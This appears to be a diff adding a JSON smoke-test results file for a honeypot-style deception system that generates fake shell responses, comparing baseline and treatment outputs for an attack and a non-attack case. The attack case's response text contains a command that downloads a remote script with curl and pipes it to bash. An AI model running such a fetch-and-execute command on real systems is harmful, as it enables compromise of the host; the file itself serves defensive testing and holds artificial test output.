@@ -1,0 +1,100 @@
+{
+  "accepted_only_commit_enforced": true,
+  "attack_strategy_observed": true,
+  "candidate_can_change": true,
+  "deterministic_verifier_executed": true,
+  "generation_input_changes": true,
+  "inputs_are_new": true,
+  "non_attack_strategy_observed": true,
+  "outside_existing_120_and_fresh_holdout": true,
+  "real_laya_executed": true,
+  "response_can_change": true,
+  "rows": [
+    {
+      "accepted_only_commit": true,
+      "baseline_candidate_sha256": "f0dd2a3d2d6089cabee0c1b1d53f43d9d5c40d0718f893fb2dfd393c904e1084",
+      "baseline_generation_input_sha256": "e699ff5dffe10b4f91f962800f6750a710f1f731e0b0545c7cee7b9ae1acb513",
+      "baseline_response_sha256": "f0dd2a3d2d6089cabee0c1b1d53f43d9d5c40d0718f893fb2dfd393c904e1084",
+      "baseline_response_text": "webapp@web-srv-01:~$ curl -fsSL http://[REDACTED_IP_PRIVATE].12/x.sh | bash\nbash: curl -fsSL http://[REDACTED_IP_PRIVATE].12/x.sh | bash: command not found",
+      "input_sha256": "e699ff5dffe10b4f91f962800f6750a710f1f731e0b0545c7cee7b9ae1acb513",
+      "name": "dedicated_attack",
+      "real_laya": true,
+      "selected_strategy": "fake_success_and_return_visits",
+      "selected_workflow_branch": "LAYA_ATTACK_STRATEGY",
+      "treatment_candidate_sha256": "aafbb8e73e18c5c1fb35ec20f7338ebd746c6e1848e9bb6604412b1e13b85091",
+      "treatment_generation_input_sha256": "14eb54d635921d68179c0395090a19a0d394d2c550b8eb1659a3a7ad44e62790",
+      "treatment_response_sha256": "aafbb8e73e18c5c1fb35ec20f7338ebd746c6e1848e9bb6604412b1e13b85091",
+      "treatment_response_text": "webapp@web-srv-01:~$ curl -fsSL http://[REDACTED_IP_PRIVATE].12/x.sh | bash\nbash: curl -fsSL http://[REDACTED_IP_PRIVATE].12/x.sh | bash: command not found\nchange applied successfully",
+      "verification": {
+        "baseline": {
+          "accepted": true,
+          "attempt": 1,
+          "candidate_sha256": "f0dd2a3d2d6089cabee0c1b1d53f43d9d5c40d0718f893fb2dfd393c904e1084",
+          "confidence": 1.0,
+          "deterministic": true,
+          "issues": [],
+          "passed": true,
+          "serve_path": "GENERATED_VERIFIED",
+          "verifier": "FictionConsistencyVerifier"
+        },
+        "treatment": {
+          "accepted": true,
+          "attempt": 1,
+          "candidate_sha256": "aafbb8e73e18c5c1fb35ec20f7338ebd746c6e1848e9bb6604412b1e13b85091",
+          "confidence": 1.0,
+          "deterministic": true,
+          "issues": [],
+          "passed": true,
+          "serve_path": "GENERATED_VERIFIED",
+          "verifier": "FictionConsistencyVerifier"
+        }
+      }
+    },
+    {
+      "accepted_only_commit": true,
+      "baseline_candidate_sha256": "0b75bfb554f5b25b9b74691d545eaf66d819a3f52e8d914a221771de1b18f873",
+      "baseline_generation_input_sha256": "4b6ded03fcedbd3fd668768ec5a958dc64bbffd9abae44500252d535fa0848b3",
+      "baseline_response_sha256": "0b75bfb554f5b25b9b74691d545eaf66d819a3f52e8d914a221771de1b18f873",
+      "baseline_response_text": " 08:47:12 up 87 days, 14:23,  3 users,  load average: 0.21, 0.34, 0.41\nwebapp@web-srv-01:~$ cat /proc/loadavg\n0.21 0.34 0.41 1/456 30192",
+      "input_sha256": "4b6ded03fcedbd3fd668768ec5a958dc64bbffd9abae44500252d535fa0848b3",
+      "name": "dedicated_non_attack",
+      "real_laya": true,
+      "selected_strategy": "low_intensity_administration",
+      "selected_workflow_branch": "LAYA_NON_ATTACK_STRATEGY",
+      "treatment_candidate_sha256": "6d02c5575e44aab0c6c4802e97e40de2cbfc68afad74bf587816a22e382228ac",
+      "treatment_generation_input_sha256": "9eb79dd06b55fa5c72ed779e9d63f741fa6a3edab7d047711da20efc4d417ba1",
+      "treatment_response_sha256": "6d02c5575e44aab0c6c4802e97e40de2cbfc68afad74bf587816a22e382228ac",
+      "treatment_response_text": " 08:47:12 up 87 days, 14:23,  3 users,  load average: 0.21, 0.34, 0.41\nwebapp@web-srv-01:~$ cat /proc/loadavg\n0.21 0.34 0.41 1/456 30192\nadministration request completed",
+      "verification": {
+        "baseline": {
+          "accepted": true,
+          "attempt": 1,
+          "candidate_sha256": "0b75bfb554f5b25b9b74691d545eaf66d819a3f52e8d914a221771de1b18f873",
+          "confidence": 1.0,
+          "deterministic": true,
+          "issues": [],
+          "passed": true,
+          "serve_path": "GENERATED_VERIFIED",
+          "verifier": "FictionConsistencyVerifier"
+        },
+        "treatment": {
+          "accepted": true,
+          "attempt": 1,
+          "candidate_sha256": "6d02c5575e44aab0c6c4802e97e40de2cbfc68afad74bf587816a22e382228ac",
+          "confidence": 1.0,
+          "deterministic": true,
+          "issues": [],
+          "passed": true,
+          "serve_path": "GENERATED_VERIFIED",
+          "verifier": "FictionConsistencyVerifier"
+        }
+      }
+    }
+  ],
+  "schema": "ragin.laya_decision_v2.manipulation_smoke.v2a",
+  "strategies_observed": [
+    "fake_success_and_return_visits",
+    "low_intensity_administration"
+  ],
+  "strategy_reaches_effective_generator": true
+}
